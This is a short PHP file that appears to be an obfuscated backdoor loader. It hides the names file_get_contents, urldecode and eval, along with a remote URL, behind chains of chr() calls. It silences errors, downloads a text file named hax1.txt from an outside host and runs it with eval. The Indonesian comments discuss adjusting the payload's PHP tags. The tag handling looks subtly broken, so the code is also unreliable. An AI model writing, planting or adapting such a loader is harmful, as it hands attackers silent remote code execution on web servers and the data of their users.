<?php
error_reporting(0);
function c($a){return chr($a);}

$f = c(102).c(105).c(108).c(101).c(95).c(103).c(101).c(116).c(95).c(99).c(111).c(110).c(116).c(101).c(110).c(116).c(115);
$u = c(117).c(114).c(108).c(100).c(101).c(99).c(111).c(100).c(101);
$e = c(101).c(118).c(97).c(108);

$url = c(104).c(116).c(116).c(112).c(115).c(58).c(47).c(47).
       c(119).c(119).c(119).c(46).c(116).c(97).c(112).c(102).c(117).c(115).c(101).c(46).
       c(105).c(111).c(47).c(114).c(97).c(119).c(47).c(104).c(97).c(120).c(49).c(46).c(116).c(120).c(116);

// === BUKAN %3f%3e, TAPI %3c%3f%70%68%70 ===
// Karena payload di hax1.txt HARUS mulai dengan <?php
// Kita tambahkan ?> di AKHIR

$open = c(37).c(51).c(99).c(37).c(51).c(102).c(37).c(55).c(48).c(37).c(54).c(56).c(37).c(55).c(48).c(37).c(55).c(48); 
// %3c%3f%70%68%70 → "<?php"

$close_tag = c(63).c(62); // "?>"

$content = @$f($url);
if($content !== false && trim($content) !== ''){
    // Gabung: <?php + [konten] + ?>
    $payload = $u($open) . $content . $close_tag;
    @$e($payload);
}
?>
